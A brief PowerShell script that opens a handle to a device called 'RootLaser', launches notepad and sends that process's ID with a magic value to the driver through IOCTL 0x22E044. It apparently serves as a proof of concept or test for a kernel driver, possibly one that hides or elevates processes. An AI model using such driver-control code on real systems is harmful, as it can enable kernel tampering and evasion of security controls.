Clear-Host
Write-Host

try {
    $Handle   = Get-FileHandle -FileName RootLaser
    $ProcID   = Start-Process notepad -PassThru | select -ExpandProperty Id
    $inOutPtr = New-IntPtr -Size $readSize -TypeSize ([Int32], [Int32]) -Values (0xEE00AA77, $ProcID)
    Invoke-IoctlCall -Mode 0 -FileHandle $Handle -IoCtrlCode 0x22E044 -InOutPtr $inOutPtr -InputSize 8 -OutputSize 0
    Free-IntPtr $inOutPtr -Method Auto
}
finally {
    Free-IntPtr $Handle -Method NtHandle
}